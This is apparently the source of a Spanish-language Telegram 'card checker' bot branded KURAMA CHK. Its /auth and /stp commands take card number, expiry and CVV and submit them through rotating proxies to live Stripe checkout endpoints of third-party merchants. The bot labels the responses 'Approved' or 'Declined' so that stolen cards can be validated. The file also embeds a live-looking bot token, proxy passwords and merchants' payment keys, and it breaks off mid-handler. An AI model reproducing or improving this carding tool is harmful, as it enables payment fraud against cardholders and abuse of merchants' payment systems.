import logging
from logging import Handler, handlers
from multiprocessing import context
import os
from signal import Handlers
import requests
import time
import string
import random
from urllib.request import urlopen
import json
import string
import random

from aiogram import Bot, Dispatcher, executor, types
from aiogram.types import ReplyKeyboardMarkup, ReplyKeyboardRemove, KeyboardButton
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from random import randint



from aiogram import Bot, Dispatcher, executor, types
from bs4 import BeautifulSoup


##
uniproxy = requests.session()
uniproxy.proxies = uniproxy 
##

proxys = {
    'http':'http://xvpdohon-rotate:j3hvas2j91cd@p.webshare.io:80/',
    'https': 'http://bnvudhvm-rotate:jkgnyp9lecnr@p.webshare.io:80/',
    'https':'http://kpsldceh-rotate:58keli6fhazy@p.webshare.io:80/',
    'https':'http://urzeqtzv-rotate:f24yk1gwccta@p.webshare.io:80/',
    'https':'http://oiinvlnx-rotate:r2lx2vr4jbjo@p.webshare.io:80/',
    'https':'http://xvpdohon-rotate:j3hvas2j91cd@p.webshare.io:80/',
    'https':'http://bnvudhvm-rotate:jkgnyp9lecnr@p.webshare.io:80/',
    'https':'http://kpsldceh-rotate:58keli6fhazy@p.webshare.io:80/',
    'https':'http://urzeqtzv-rotate:f24yk1gwccta@p.webshare.io:80/',
    'https':'http://oiinvlnx-rotate:r2lx2vr4jbjo@p.webshare.io:80/',
    'https':'http://hftsdyhr-rotate:iziwp0qs6av1@p.webshare.io:80/'}


comand = "/.,*"
bot = bool(os.environ.get('bot', True))
token = os.environ.get("token", None)

bot = Bot(token="6188249734:AAH0h51am6PcCseOo1OgfFvpo0BKj8LTJks", parse_mode=types.ParseMode.HTML)
iniciar = Dispatcher(bot)

button1 = InlineKeyboardButton(text="𝗢𝘄𝗻𝗲𝗿", callback_data="creador")
button2 = InlineKeyboardButton(text="𝗚𝗮𝘁𝗲𝘀", callback_data="gate")
button3 = InlineKeyboardButton(text="𝗠𝘆 𝗦𝗰𝗿𝗮𝗽𝗽𝗲𝗿", callback_data="randomvalue_of10")
keyboard_inline = InlineKeyboardMarkup().add(button1, button2, button3)

admins = [5629056050, 5019536742]



@iniciar.callback_query_handler(text=["randomvalue_of10", "creador", "gate"])
async def random_value(call: types.CallbackQuery):
    if call.data == "creador":
        await call.message.answer("☘ 𝗢𝘄𝗻𝗲𝗿 𝗕𝗼𝘁 ☘: @DiegoAkk")
    if call.data == "gate":
        await call.message.answer("""
<b>🛠 𝗚𝗮𝘁𝗲𝘀 𝗱𝗲𝗹 𝗕𝗼𝘁 🛠 </b>

🔵 [🝂] /auth: **Stripe Charged Auth** | Status: On ✅        
🟡 [🝂] /stp: **Stripe Auth** | Status: On ✅

                        
                        """)
    elif call.data == "randomvalue_of10":
        await call.message.answer("💰UNETE A NUESTRO SCRAPPER GRATUITO: @KURAMAVIPSCRAPPER💰")
    await call.answer()


########################## COMDANDO START ################################


@iniciar.message_handler(commands=['start'])
async def start_answer(message: types.Message):
    await message.answer_photo('https://imgur.com/ZO72OAT', "a", reply_markup=keyboard_inline)


########################## FIN COMANDO START ################################


########################## COMANDO CMDS ################################


@iniciar.message_handler(commands=["cmds"], commands_prefix=comand)
async def cmds(message: types.Message):
    cmd = await message.reply("<b>LISTA DE COMANDOS 𝐊𝐔𝐑𝐀𝐌𝐀 𝐂𝐇𝐊 </b>")
    time.sleep(1)
    await cmd.edit_text("""
𝗠𝗶𝘀 𝗰𝗼𝗺𝗮𝗻𝗱𝗼𝘀 𝘀𝗼𝗻

○ /cmds  ✅
○ /gates ✅
○ /bin ✅

                        """)
                        
########################## FIN COMANDO CMDS ################################




########################## COMDANDO GATES ################################


@iniciar.message_handler(commands=["gates"], commands_prefix=comand)
async def gates(message: types.Message):
    cmd = await message.reply("<b>LISTA DE COMANDOS 𝐊𝐔𝐑𝐀𝐌𝐀 𝐂𝐇𝐊 </b>")
    time.sleep(1)
    await cmd.edit_text("""
<b>🛠 𝗚𝗮𝘁𝗲𝘀 𝗱𝗲𝗹 𝗕𝗼𝘁 🛠 </b>

🔵 [🝂] /auth: <b>Stripe Charged Auth</b> | <b>Status: On</b> ✅        
🟡 [🝂] /stp: <b>Stripe Auth</b> | <b>Status: On</b> ✅          
                                       
                        """)
########################## FIN COMANDO GATES ################################


########################## INFO BIN ################################

@iniciar.message_handler(commands=['bin'], commands_prefix=comand)
async def helpstr(message: types.Message):
    await message.answer_chat_action("typing")
    BIN = message.text[len("/bin "): 11]
    if len(BIN) < 6:
        return await message.reply("<b>❗️ ERROR INGRESE BIEN EL BIN  ❗️</b>")
    if not BIN:
        return await message.reply("Did u Really Know how to use me.")
    bin1 = await message.reply(f"<b>💳BIN: {BIN}\nᴘʀᴏᴄᴇss: [🔴]</b>")
    apis1 = uniproxy.get(f"https://projectslost.xyz/bin/?bin={BIN}").json()
    ID = message.from_user.id
    FIRST = message.from_user.first_name
    result=apis1['status']
    banke=apis1['bank']
    bank=banke['name']
    brand=apis1['brand']
    bn=apis1['query']
    typ=apis1['type']
    lv=apis1['level']
    country1=apis1['country']
    country=country1['name']
    
    
    bin2 = await bin1.edit_text(f"<b>💳BIN: {BIN}\nᴘʀᴏᴄᴇss: [🔴][🟡]</b>")
    time.sleep(1)
    bin3 = await bin2.edit_text(f"<b>💳BIN: {BIN}\nᴘʀᴏᴄᴇss: [🔴][🟡][🟢]</b>")

    await bin3.edit_text(f"""
[ϟ] <b>Bin Lookup</b>
━━━━━━━━━━━━━
[Ϟ] <b>Bin</b>: {bn}
[Ϟ] <b>Vendor</b>: {brand}
[Ϟ] <b>Type</b>: {typ}
[Ϟ] <b>Level</b>: {lv}
[Ϟ] <b>Bank</b>: {bank}
[Ϟ] <b>Country</b>: {country}
━━━━━━━━━━━━━
<b>Checked By:</b> <a href="tg://user?id={ID}">{FIRST}</a>

""")

########################## FIN INFO BIN ################################



 ################## GATE AUTH ######################################   

@iniciar.message_handler(commands=["auth"], commands_prefix=comand)
async def auth(message: types.Message):
    ini = time.perf_counter()
    ccs = message.text[len('/auth '):]
    ccs1 = ccs
    if not ccs1:
        await message.reply(" <b>Gateway: Stripe Charged Auth, Status: On</b> ✅, /auth card|month|year|cvv")
    
    spli = ccs.split('|')
    cc = spli[0]
    mes = spli[1]
    ano = spli[2]
    cvv = spli[3] 
    m1 = await message.reply(f"<b>💳ᴄᴀʀᴅ: {ccs}\nᴘʀᴏᴄᴇss: [🔴]</b>")
    ID = message.from_user.id
    FIRST = message.from_user.first_name
    
    nombre = "Andres"
    correo = "jefersonbenthanpalacio@gmail.com"

    cabeza= {
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
    'accept': '*/*',
    'content-type': 'text/plain;charset=UTF-8'
    }
    

    apigate2 = uniproxy.post('https://m.stripe.com/6', headers=cabeza).json()

    muid = apigate2["muid"]
    guid = apigate2["guid"]
    sid = apigate2["sid"]
    
    
    apis = uniproxy.get(f"https://projectslost.xyz/bin/?bin={cc[:6]}").json()
    result=apis['status']
    banke=apis['bank']
    bank=banke['name']
    brand=apis['brand']
    bn=apis['query']
    typ=apis['type']
    lv=apis['level']
    country1=apis['country']
    country=country1['name']
    #await message.reply(f"""
    #<code> {sid} </code>
    #<code> {muid} </code>
    #<code> {guid} </code>""")

    heade= {
    "authority": "api.stripe.com",
    "method": "POST",
    "path": "/v1/payment_intents/pi_3MNqSWHKSiz0kTyd1fdRymj6/confirm",
    "scheme": "https",
    "accept": "application/json",
    "accept-encoding": "gzip, deflate, br",
    "accept-language": "es-ES,es;q=0.9",
    "content-length": "790",
    "content-type": "application/x-www-form-urlencoded",
    "dnt": "1",
    "origin": "https://js.stripe.com",
    "referer": "https://js.stripe.com/",
    #"sec-ch-ua": "Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "Windows",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"}


    data = f'payment_method_data[type]=card&payment_method_data[billing_details][name]={nombre}+&payment_method_data[card][number]={cc}&payment_method_data[card][cvc]={cvv}&payment_method_data[card][exp_month]={mes}&payment_method_data[card][exp_year]={ano}&payment_method_data[guid]={guid}&payment_method_data[muid]={muid}&payment_method_data[sid]={sid}&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2Facd3f7780%3B+stripe-js-v3%2Facd3f7780&payment_method_data[time_on_page]=28789&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_iHIxB7OJrLLocOUih5WWEfc3&client_secret=pi_3MNqyaHKSiz0kTyd07Hr9Z2T_secret_medWP9r4hBOHTmVpoUQnjBcjs'
    
    apigate2 = uniproxy.post("https://api.stripe.com/v1/payment_intents/pi_3MNqyaHKSiz0kTyd07Hr9Z2T/confirm", headers=heade, data=data).json()
    code = apigate2['error']['code']
    code2 = apigate2['error']['message']
    

 

    final = time.perf_counter() 
    m2 = await m1.edit_text(f"<b>💳ᴄᴀʀᴅ: {ccs}\nᴘʀᴏᴄᴇss: [🔴][🟡]</b>")
    m3 = await m2.edit_text(f"<b>💳ᴄᴀʀᴅ: {ccs}\nᴘʀᴏᴄᴇss: [🔴][🟡][🟢]</b>")

    time.sleep(1)
    
            
    if "Your card's security code is incorrect." in code2:
        await m3.edit_text(f""" 
<b>𐎢 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ꜱᴛʀɪᴘᴇ ᴄʜᴀʀɢᴇᴅ ᴀᴜᴛʜ</b>

𝐂𝐂: <code>{ccs}</code> 
𝐒𝐭𝐚𝐭𝐮𝐬: 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅
𝐌𝐞𝐬𝐬𝐚𝐠𝐞: 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅
—————— 𝐁𝐢𝐧 𝐈𝐧𝐟𝐨 ——————
𝐁𝐢𝐧: {bn}|{brand}|{typ}|{lv}
𝐁𝐚𝐧𝐤: {bank}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country}
—————— 𝐁𝐨𝐭 𝐈𝐧𝐟𝐨 ——————
𝐓𝐢𝐦𝐞:  {final-ini:0.2} (segund)
𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a>
𝐁𝐨𝐭 𝐁𝐲: @DiegoAkk
""")
        
    if "incorrect_number" in code:
        await m3.edit_text(f""" 
<b>𐎢 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ꜱᴛʀɪᴘᴇ ᴄʜᴀʀɢᴇᴅ ᴀᴜᴛʜ</b>

𝐂𝐂: <code>{ccs}</code> 
𝐒𝐭𝐚𝐭𝐮𝐬: 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌
𝐌𝐞𝐬𝐬𝐚𝐠𝐞: {code2}
—————— 𝐁𝐢𝐧 𝐈𝐧𝐟𝐨 ——————
𝐁𝐢𝐧: {bn}|{brand}|{typ}|{lv}
𝐁𝐚𝐧𝐤: {bank}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country}
—————— 𝐁𝐨𝐭 𝐈𝐧𝐟𝐨 ——————
𝐓𝐢𝐦𝐞:  {final-ini:0.2} (segund)
𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a>
𝐁𝐨𝐭 𝐁𝐲: @DiegoAkk
""")
        
    if "You have exceeded the maximum number of declines on this card in the last 24 hour period. Please contact us via https://support.stripe.com/contact if you need further assistance." in code2:
        await m3.edit_text(f""" 
<b>𐎢 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ꜱᴛʀɪᴘᴇ ᴄʜᴀʀɢᴇᴅ ᴀᴜᴛʜ</b>

𝐂𝐂: <code>{ccs}</code> 
𝐒𝐭𝐚𝐭𝐮𝐬: 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌
𝐌𝐞𝐬𝐬𝐚𝐠𝐞: {code2}
—————— 𝐁𝐢𝐧 𝐈𝐧𝐟𝐨 ——————
𝐁𝐢𝐧: {bn}|{brand}|{typ}|{lv}
𝐁𝐚𝐧𝐤: {bank}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country}
—————— 𝐁𝐨𝐭 𝐈𝐧𝐟𝐨 ——————
𝐓𝐢𝐦𝐞:  {final-ini:0.2} (segund)
𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a>
𝐁𝐨𝐭 𝐁𝐲: @DiegoAkk
""")
        
        
    if "Your card's security code is invalid." in code2:
        await m3.edit_text(f""" 
<b>𐎢 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ꜱᴛʀɪᴘᴇ ᴄʜᴀʀɢᴇᴅ ᴀᴜᴛʜ</b>

𝐂𝐂: <code>{ccs}</code> 
𝐒𝐭𝐚𝐭𝐮𝐬: 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅
𝐌𝐞𝐬𝐬𝐚𝐠𝐞: 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 𝑪𝒄𝒏 ✅
—————— 𝐁𝐢𝐧 𝐈𝐧𝐟𝐨 ——————
𝐁𝐢𝐧: {bn}|{brand}|{typ}|{lv}
𝐁𝐚𝐧𝐤: {bank}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country}
—————— 𝐁𝐨𝐭 𝐈𝐧𝐟𝐨 ——————
𝐓𝐢𝐦𝐞:  {final-ini:0.2} (segund)
𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a>
𝐁𝐨𝐭 𝐁𝐲: @DiegoAkk
""")


    if "Your card does not support this type of purchase." in code2:
        await m3.edit_text(f""" 
<b>𐎢 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ꜱᴛʀɪᴘᴇ ᴄʜᴀʀɢᴇᴅ ᴀᴜᴛʜ</b>

𝐂𝐂: <code>{ccs}</code> 
𝐒𝐭𝐚𝐭𝐮𝐬: 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌
𝐌𝐞𝐬𝐬𝐚𝐠𝐞: {code2}
—————— 𝐁𝐢𝐧 𝐈𝐧𝐟𝐨 ——————
𝐁𝐢𝐧: {bn}|{brand}|{typ}|{lv}
𝐁𝐚𝐧𝐤: {bank}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country}
—————— 𝐁𝐨𝐭 𝐈𝐧𝐟𝐨 ——————
𝐓𝐢𝐦𝐞:  {final-ini:0.2} (segund)
𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a>
𝐁𝐨𝐭 𝐁𝐲: @DiegoAkk
""")

        
    if "Your card's expiration year is invalid." in code2:
        await m3.edit_text(f""" 
<b>𐎢 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ꜱᴛʀɪᴘᴇ ᴄʜᴀʀɢᴇᴅ ᴀᴜᴛʜ</b>

𝐂𝐂: <code>{ccs}</code> 
𝐒𝐭𝐚𝐭𝐮𝐬: 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌
𝐌𝐞𝐬𝐬𝐚𝐠𝐞: {code2}
—————— 𝐁𝐢𝐧 𝐈𝐧𝐟𝐨 ——————
𝐁𝐢𝐧: {bn}|{brand}|{typ}|{lv}
𝐁𝐚𝐧𝐤: {bank}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country}
—————— 𝐁𝐨𝐭 𝐈𝐧𝐟𝐨 ——————
𝐓𝐢𝐦𝐞:  {final-ini:0.2} (segund)
𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a>
𝐁𝐨𝐭 𝐁𝐲: @DiegoAkk
""")
        
        
    if "Your card has insufficient funds." in code2:
        await m3.edit_text(f""" 
<b>𐎢 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ꜱᴛʀɪᴘᴇ ᴄʜᴀʀɢᴇᴅ ᴀᴜᴛʜ</b>

𝐂𝐂: <code>{ccs}</code> 
𝐒𝐭𝐚𝐭𝐮𝐬: 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅
𝐌𝐞𝐬𝐬𝐚𝐠𝐞: 𝐘𝐨𝐮𝐫 𝐜𝐚𝐫𝐝 𝐡𝐚𝐬 𝐢𝐧𝐬𝐮𝐟𝐟𝐢𝐜𝐢𝐞𝐧𝐭 𝐟𝐮𝐧𝐝𝐬.
—————— 𝐁𝐢𝐧 𝐈𝐧𝐟𝐨 ——————
𝐁𝐢𝐧: {bn}|{brand}|{typ}|{lv}
𝐁𝐚𝐧𝐤: {bank}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country}
—————— 𝐁𝐨𝐭 𝐈𝐧𝐟𝐨 ——————
𝐓𝐢𝐦𝐞:  {final-ini:0.2} (segund)
𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a>
𝐁𝐨𝐭 𝐁𝐲: @DiegoAkk
""")
    
    if "Your card was declined." in code2:
        await m3.edit_text(f""" 
<b>𐎢 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ꜱᴛʀɪᴘᴇ ᴄʜᴀʀɢᴇᴅ ᴀᴜᴛʜ</b>

𝐂𝐂: <code>{ccs}</code> 
𝐒𝐭𝐚𝐭𝐮𝐬: 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌
𝐌𝐞𝐬𝐬𝐚𝐠𝐞: {code2}
—————— 𝐁𝐢𝐧 𝐈𝐧𝐟𝐨 ——————
𝐁𝐢𝐧: {bn}|{brand}|{typ}|{lv}
𝐁𝐚𝐧𝐤: {bank}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country}
—————— 𝐁𝐨𝐭 𝐈𝐧𝐟𝐨 ——————
𝐓𝐢𝐦𝐞:  {final-ini:0.2} (segund)
𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a>
𝐁𝐨𝐭 𝐁𝐲: @DiegoAkk
""")
        
            


@iniciar.message_handler(commands=['stp'], commands_prefix=comand)
async def da(message: types.Message):
    contra = await message.reply("<b>ᴘʀᴏᴄᴇss: ❗ Comprobando acceso ❗</b>")
    time.sleep(1)
    user = message.from_user.id
    if user in admins :
        await contra.edit_text('Estas autorizado!')
    
    else:
        await contra.edit_text('❗ No tienes acceso para utilizar este comando. ❗ Contacta a @DarwinOficial.')
        return str;
    ini = time.perf_counter()
    ccs = message.text[len('/stp '):]
    
    if not ccs:
        await contra.edit_text("❗ ERROR INGRESE BIEN LA TARJETA ❗")

    spli = ccs.split('|')
    cc = spli[0]
    mes = spli[1]
    ano = spli[2]
    cvv = spli[3]
    m1 = await contra.edit_text(f"<b>💳ᴄᴀʀᴅ: {ccs}\nᴘʀᴏᴄᴇss: [🔴]</b>") 
    
    nombre = "darwin moreno belardo"
    mail = "darwinmoreno366773@yahoo.com"


    apis99 = uniproxy.get(f"https://projectslost.xyz/bin/?bin={cc[:6]}").json()
    result=apis99['status']
    banke=apis99['bank']
    bank=banke['name']
    brand=apis99['brand']
    bn=apis99['query']
    typ=apis99['type']
    lv=apis99['level']
    country1=apis99['country']
    country=country1['name']
    
    
   
    head22 = {
    'user-agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.54',
    'accept': '*/*',
    'content-type': 'text/plain;charset=UTF-8'
    }
    
    api1 = uniproxy.post("https://m.stripe.com/6", headers=head22).json()
    muid = api1["muid"]
    guid = api1["guid"]
    sid = api1["sid"]
    
    headers33 = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'es-419,es;q=0.9,es-ES;q=0.8,en;q=0.7,en-GB;q=0.6,en-US;q=0.5',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://checkout.stripe.com',
    'referer': 'https://checkout.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="99", "Microsoft Edge";v="109", "Chromium";v="109"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edg/109.0.1518.55',
    }

    data = f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano}&billing_details[name]={nombre}+moreno&billing_details[email]=zdxrnavckbhwh%40triots.com&billing_details[address][country]=US&billing_details[address][postal_code]=10080&guid={guid}&muid={muid}&sid={sid}&key=pk_live_51LsYR6AKFjq10TnePvmDsUU6mDT7UzQSmvz3RchEeBz6AQqfrnH9L16mD8hcajweCoaPUxDuCKVPFZdPjBl4f5XC00JTPKVfby&payment_user_agent=stripe.js%2Fe9a259df8%3B+stripe-js-v3%2Fe9a259df8%3B+checkout'

    response333 = uniproxy.post('https://api.stripe.com/v1/payment_methods', headers=headers33, data=data).json()

    headers44 = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'es-419,es;q=0.9,es-ES;q=0.8,en;q=0.7,en-GB;q=0.6,en-US;q=0.5',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://checkout.stripe.com',
    'referer': 'https://checkout.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="99", "Microsoft Edge";v="109", "Chromium";v="109"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'user-agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edg/109.0.1518.55',
    }

    data22 = f'eid=NA&payment_method={id}&expected_amount=100&last_displayed_line_item_group_details[subtotal]=100&last_displayed_line_item_group_details[total_exclusive_tax]=0&last_displayed_line_item_group_details[total_inclusive_tax]=0&last_displayed_line_item_group_details[total_discount_amount]=0&last_displayed_line_item_group_details[shipping_rate_amount]=0&expected_payment_method_type=card&key=pk_live_51LsYR6AKFjq10TnePvmDsUU6mDT7UzQSmvz3RchEeBz6AQqfrnH9L16mD8hcajweCoaPUxDuCKVPFZdPjBl4f5XC00JTPKVfby'

    response22 = uniproxy.post('https://api.stripe.com/v1/payment_pages/cs_live_a1uHRs9txmLbfbO8adULufenB6hZMXHKhJW2glnTbpyTwZx5agSQmY9CNL/confirm', headers=headers44, data=data22).json()
    error1 = response22['error']['code']
    error2 = response22['error']['message']
    
    
    final = time.perf_counter() 
    m2 = await m1.edit_text(f"<b>💳ᴄᴀʀᴅ: {ccs}\nᴘʀᴏᴄᴇss: [🔴][🟡]</b>")
    m3 = await m2.edit_text(f"<b>💳ᴄᴀʀᴅ: {ccs}\nᴘʀᴏᴄᴇss: [🔴][🟡][🟢]</b>")

    time.sleep(1)
    
            
    if "Your card's security code is incorrect." in error2:
        await m3.edit_text(f""" 
<b>𐎢 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ꜱᴛʀɪᴘᴇ ᴄʜᴀʀɢᴇᴅ ᴀᴜᴛʜ</b>

𝐂𝐂: <code>{ccs}</code> 
𝐒𝐭𝐚𝐭𝐮𝐬: 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅
𝐌𝐞𝐬𝐬𝐚𝐠𝐞: 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 𝑪𝒄𝒏 ✅
—————— 𝐁𝐢𝐧 𝐈𝐧𝐟𝐨 ——————
𝐁𝐢𝐧: {bn}|{brand}|{typ}|{lv}
𝐁𝐚𝐧𝐤: {bank}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country}
—————— 𝐁𝐨𝐭 𝐈𝐧𝐟𝐨 ——————
𝐓𝐢𝐦𝐞:  {final-ini:0.2} (segund)
𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a>
𝐁𝐨𝐭 𝐁𝐲: @DiegoAkk """)
        
    if "incorrect_number" in error2:
        await m3.edit_text(f""" 
<b>𐎢 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ꜱᴛʀɪᴘᴇ ᴄʜᴀʀɢᴇᴅ ᴀᴜᴛʜ</b>

𝐂𝐂: <code>{ccs}</code> 
𝐒𝐭𝐚𝐭𝐮𝐬: 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌
𝐌𝐞𝐬𝐬𝐚𝐠𝐞: {error2}
—————— 𝐁𝐢𝐧 𝐈𝐧𝐟𝐨 ——————
𝐁𝐢𝐧: {bn}|{brand}|{typ}|{lv}
𝐁𝐚𝐧𝐤: {bank}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country}
—————— 𝐁𝐨𝐭 𝐈𝐧𝐟𝐨 ——————
𝐓𝐢𝐦𝐞:  {final-ini:0.2} (segund)
𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a>
𝐁𝐨𝐭 𝐁𝐲: @DiegoAkk """)
        
    if "You have exceeded the maximum number of declines on this card in the last 24 hour period. Please contact us via https://support.stripe.com/contact if you need further assistance." in error2:
        await m3.edit_text(f""" 
<b>𐎢 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ꜱᴛʀɪᴘᴇ ᴄʜᴀʀɢᴇᴅ ᴀᴜᴛʜ</b>

𝐂𝐂: <code>{ccs}</code> 
𝐒𝐭𝐚𝐭𝐮𝐬: 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌
𝐌𝐞𝐬𝐬𝐚𝐠𝐞: {error2}
—————— 𝐁𝐢𝐧 𝐈𝐧𝐟𝐨 ——————
𝐁𝐢𝐧: {bn}|{brand}|{typ}|{lv}
𝐁𝐚𝐧𝐤: {bank}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country}
—————— 𝐁𝐨𝐭 𝐈𝐧𝐟𝐨 ——————
𝐓𝐢𝐦𝐞:  {final-ini:0.2} (segund)
𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a>
𝐁𝐨𝐭 𝐁𝐲: @DiegoAkk """)
        
        
    if "Your card's security code is invalid." in error2:
        await m3.edit_text(f""" 
<b>𐎢 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ꜱᴛʀɪᴘᴇ ᴄʜᴀʀɢᴇᴅ ᴀᴜᴛʜ</b>

𝐂𝐂: <code>{ccs}</code> 
𝐒𝐭𝐚𝐭𝐮𝐬: 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅
𝐌𝐞𝐬𝐬𝐚𝐠𝐞: 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅
—————— 𝐁𝐢𝐧 𝐈𝐧𝐟𝐨 ——————
𝐁𝐢𝐧: {bn}|{brand}|{typ}|{lv}
𝐁𝐚𝐧𝐤: {bank}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country}
—————— 𝐁𝐨𝐭 𝐈𝐧𝐟𝐨 ——————
𝐓𝐢𝐦𝐞:  {final-ini:0.2} (segund)
𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a>
𝐁𝐨𝐭 𝐁𝐲: @DiegoAkk """)
        
        
    if "Your card does not support this type of purchase." in error2:
        await m3.edit_text(f""" 
<b>𐎢 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ꜱᴛʀɪᴘᴇ ᴄʜᴀʀɢᴇᴅ ᴀᴜᴛʜ</b>

𝐂𝐂: <code>{ccs}</code> 
𝐒𝐭𝐚𝐭𝐮𝐬: 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌
𝐌𝐞𝐬𝐬𝐚𝐠𝐞: {error2}
—————— 𝐁𝐢𝐧 𝐈𝐧𝐟𝐨 ——————
𝐁𝐢𝐧: {bn}|{brand}|{typ}|{lv}
𝐁𝐚𝐧𝐤: {bank}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country}
—————— 𝐁𝐨𝐭 𝐈𝐧𝐟𝐨 ——————
𝐓𝐢𝐦𝐞:  {final-ini:0.2} (segund)
𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a>
𝐁𝐨𝐭 𝐁𝐲: @DiegoAkk """)
        
        
    if "Your card's expiration year is invalid." in error2:
        await m3.edit_text(f""" 
<b>𐎢 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ꜱᴛʀɪᴘᴇ ᴄʜᴀʀɢᴇᴅ ᴀᴜᴛʜ</b>

𝐂𝐂: <code>{ccs}</code> 
𝐒𝐭𝐚𝐭𝐮𝐬: 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌
𝐌𝐞𝐬𝐬𝐚𝐠𝐞: {error2}
—————— 𝐁𝐢𝐧 𝐈𝐧𝐟𝐨 ——————
𝐁𝐢𝐧: {bn}|{brand}|{typ}|{lv}
𝐁𝐚𝐧𝐤: {bank}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country}
